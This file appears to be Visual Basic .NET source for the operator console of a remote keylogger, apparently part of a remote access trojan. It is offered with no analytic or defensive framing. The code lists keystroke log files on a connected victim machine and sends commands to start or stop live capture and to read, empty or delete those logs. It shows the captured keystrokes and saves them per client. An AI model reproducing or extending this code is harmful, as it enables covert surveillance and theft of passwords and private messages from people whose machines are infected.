﻿Public Class key_logger
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String

    Sub Client_data(ByVal data As String)
        Try
            If data IsNot Nothing Then

                If data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]") Then
                    Dim spl_Exception() As String = {"[My/Exception]"}
                    Dim p() As String = data.Split(spl_Exception, StringSplitOptions.RemoveEmptyEntries)
                    Label1.Text = p(0)

                    If (p(0) = "Can not access") Then
                        Panel1.Enabled = False
                        Panel2.Enabled = False
                    End If

                    If Panel3.Visible = False Then Panel3.Visible = True
                    'TabControl1.Enabled = False
                Else
                    Dim split_Ary() As String = {Form1.s.split_Ary}
                    Dim Ary() As String = data.Split(split_Ary, StringSplitOptions.RemoveEmptyEntries)
                    Select Case Ary(0)
                        Case "offline"


                            RichTextBox1.Text = Nothing
                            Dim sb As New System.Text.StringBuilder
                            sb.Append(data)
                            sb = sb.Replace(Form1.s.split_Line, vbNewLine)
                            sb = sb.Replace(Form1.s.split_Ary, vbNewLine)
                            RichTextBox1.AppendText(sb.ToString)
                            RichTextBox1.ScrollToCaret()
                            store_0.Save_0(Name_Client & Client_ID & "\" & "Keylogger", sb.ToString)


                        Case "online"



                            If Ary.Length = 3 Then
                                Dim sb As New System.Text.StringBuilder
                                sb.Append(Ary(1) + vbNewLine + Ary(2) + vbNewLine)
                                RichTextBox2.AppendText(sb.ToString)
                                RichTextBox2.ScrollToCaret()
                            End If




                        Case "start"
                            Dim split_p() As String = {Form1.s.split_paths}
                            Dim p() As String = Ary(1).Split(split_p, StringSplitOptions.RemoveEmptyEntries)
                            ComboBox1.Items.Clear()

                            For u% = 0 To p.Length - 1
                                If (p(u).StartsWith("config")) And p(u).EndsWith(".log") Then
                                    ComboBox1.Items.Add(p(u))
                                End If

                            Next

                            If ComboBox1.Items.Count > 0 Then
                                ComboBox1.Text = ComboBox1.Items(ComboBox1.Items.Count - 1)
                            End If
                    End Select


                    If Panel3.Visible = True Then Panel3.Visible = False


                End If
                refres_title()


            End If
        Catch ex As Exception

            'MsgBox(ex.ToString)
        End Try
    End Sub
    Private Sub ComboBox1_MouseWheel(sender As Object, e As MouseEventArgs) Handles ComboBox1.MouseWheel
        Dim mwe As HandledMouseEventArgs = DirectCast(e, HandledMouseEventArgs)
        mwe.Handled = True
    End Sub
    Private Sub ComboBox1_KeyPress(sender As Object, e As KeyPressEventArgs) Handles ComboBox1.KeyPress
        e.Handled = True
    End Sub
    Private Sub key_logger_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        RichTextBox1.ContextMenuStrip = store_0.ContextMenu1
        RichTextBox2.ContextMenuStrip = store_0.ContextMenu1

        refres_title()
        Me.Icon = store_0.icons_0("window")
        TabPage1.Text = "Offline"
        TabPage2.Text = "Online"
        TabPage1.Select()
    End Sub
    Private Sub refres_title()
        Dim title As String = String.Format("Keylogger" + " - Remote Address & Port: {0} Client Name: {1}", Client_remote_Address, Name_Client)
        Text = title
    End Sub


    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If Not ComboBox1.Text = Nothing Then
            Form1.s.Send(handle_Number_Client, "key_logger_read" + Form1.s.SplitData + ComboBox1.Text)
        End If

    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If Not ComboBox1.Text = Nothing Then
            Form1.s.Send(handle_Number_Client, "key_logger_emptying" + Form1.s.SplitData + ComboBox1.Text)
        End If

    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Form1.s.Send(handle_Number_Client, "key_logger_online_start" + Form1.s.SplitData)
        Button4.Enabled = False
        Button3.Enabled = True
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Form1.s.Send(handle_Number_Client, "key_logger_online_stop" + Form1.s.SplitData)

        Button3.Enabled = False
        Button4.Enabled = True
    End Sub

    Private Sub key_logger_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Form1.s.Send(handle_Number_Client, "key_logger_online_stop" + Form1.s.SplitData)
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Try
            If Not ComboBox1.Text = Nothing Then
                Form1.s.Send(handle_Number_Client, "key_logger_delete" + Form1.s.SplitData + ComboBox1.Text)

                Dim index As Integer = ComboBox1.SelectedIndex
                ComboBox1.Items.RemoveAt(index)
                If ComboBox1.Items.Count > 0 Then
                    ComboBox1.Text = ComboBox1.Items(ComboBox1.Items.Count - 1)
                Else
                    ComboBox1.Text = Nothing
                End If
            End If
        Catch ex As Exception

        End Try

    End Sub


End Class